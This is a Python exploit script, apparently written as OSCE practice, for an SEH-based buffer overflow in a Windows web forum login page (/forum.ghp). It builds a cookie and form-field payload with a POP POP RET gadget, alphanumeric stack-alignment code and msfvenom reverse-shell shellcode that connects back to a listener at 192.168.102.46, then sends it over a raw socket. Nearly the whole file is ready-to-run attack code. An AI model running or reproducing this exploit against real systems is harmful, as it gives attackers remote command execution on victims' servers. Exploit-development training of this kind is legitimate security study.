#!/usr/bin/env python3

# Tyler Boykin
# 
# This is a time-trial in prep for OSCE. 
# Resources utilized during this:
#   https://www.exploit-db.com/exploits/44485  (for the installer)

#   Successful on:
#       Windows 2003 SP 1 Standard
#       Windows Vista Ultimate            
#       Windows 8.1 Pro
#   Total time: 3 hours :)

from struct import pack
import sys
import socket

def p(x):
    return pack('<I',x)

RHOST = ''
RPORT = 80
PATH="/forum.ghp"
PROTO="http"
VERB="POST"
for k,v in enumerate(sys.argv):
    if v in ['-r','--rhost']:
        RHOST = sys.argv[k+1]
    if v in ['-p','--rport']:
        RPORT = int(sys.argv[k+1])
    if v in ['-h','--h','-help','--help']:
        usage()

if RHOST == '':
    sys.stderr.write("[-] RHOST (-r, --rhost) is mandatory!\n")
    sys.exit(-1)


if RPORT != 80 or RPORT != 443:
    HOST = f"{RHOST}:{RPORT}"
else:
    HOST = f"{RHOST}"

OFFSET = 4063
TAIL = 6933
PASSWORD_LEN = 10890

passwd = ''

pre_buf = ""
pre_buf += "\x54"
pre_buf += "\x58"
pre_buf += "\x2d\x52\x55\x55\x55"       #__ALIGN STACK POINTER
pre_buf += "\x2d\x52\x55\x55\x55"       #__SUB EAX, 5555552
pre_buf += "\x2d\x52\x55\x55\x55"
pre_buf += "\x48\x48"                   #__BACK UP A LITTLE
pre_buf += "\x50\x5C\x5c"
pre_buf += "\x54"
pre_buf += "\x58"
pre_buf += "\x04\x24"                   #__SET EAX AHEAD IN THE STACK


# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.102.46 LPORT=123 -e x86/alpha_mixed BufferRegister=EAX -f raw
buf = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIil8hlBGp30EP50mY8eP1O0e4LKF000NkRrVllKrrDTNkprgX6ox7bj16UaKOllwLcQSLeRdlWPyQxOdMWqhGIrJR0RaGlKrrb0lKCzEllKbl213Hxcg8EQN1F1LKRyepC1zslK2i7h9swJG9LKvTLKFakftqIolliQZo4MfaxGTx9pt5hvs3QmHxekCMwTPuJD2xlKPX14gqxSu6NkvlBklKPXuLfaXSnk34nkwqn0LI0DVDq4qKCku1QIqJPQ9oKP3o3ocjlKTRjKnmqMrHTstrS0S01x0wcC6RaOrtaxblsGDfdGioN5nXLPc1s0Wp4iHDPTrpqxEyK0PkwpKOKeBpf0PPrpw0rp1P60QxKZTOIOm0Io9Enwpj5UrH9Py8BFTnu8dBWpUPSKnikV2JB0661GE8lYnErTaqkOIEMUKpCDFlio0N3845hlsXjPh592pVYoYEaxcSrM1tePNizCPWCg3g01ZVsZGb69bvxbymsVo7ctdd5luQc1NmbdQ44PhFC00DbtRpV6QFQFqVPVbncfqF2sCfQx3IzleolFkO9EOym0pNRvG6yo4psXtHMWwmcPKOJuOK8pH5oRsf1xNFMEOMOm9ozuWLgvSLdJk0ykipPu7uoK2guCD2BOQzWpV3IoHUAA"

pop_pop_ret_1 = p(0x1001416D).decode('latin1')

exploit = ""
exploit += "A" * (4063 - 4)     #__FILLER WITH -4 FOR SHORT JMP
exploit += 'HHw\x04'            #__SMOL CONDITIONAL JUMP, ALPHA SAFE
exploit += pop_pop_ret_1        #__POP POP RET
exploit += pre_buf              #__THE PRE EXPLOIT FUN
exploit += "B" * 2              #__2 BYTE SHIM
exploit += buf                  #__SHELLCODE
exploit += "Z" * (6933 - len(pre_buf))

c_len = len(exploit)

request = ""
request += f"{VERB} {PATH} HTTP/1.1\r\n"
request += f"Host:  {HOST}\r\n"
request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
request += "Accept-Language: en-US,en;q=0.5\r\n"
request += "Accept-Encoding: gzip, deflate\r\n"
request += "Referer: {RHOST}\r\n"
request += "Content-Type: application/x-www-form-urlencoded\r\n"
request += f"Content-Length: {c_len}\r\n"
request += f"Cookie: UserID={exploit}; PassWD={passwd}; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n"
request += "Connection: keep-alive\r\n"
request += "Upgrade-Insecure-Requests: 1\r\n\r\n"
request += f"frmLogin=true&frmUserName={exploit}&frmUserPass={passwd}&login=Login%21\r\n\r\n"

sockfd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sockfd.connect((RHOST,RPORT))
sockfd.send(request.encode('latin1'))
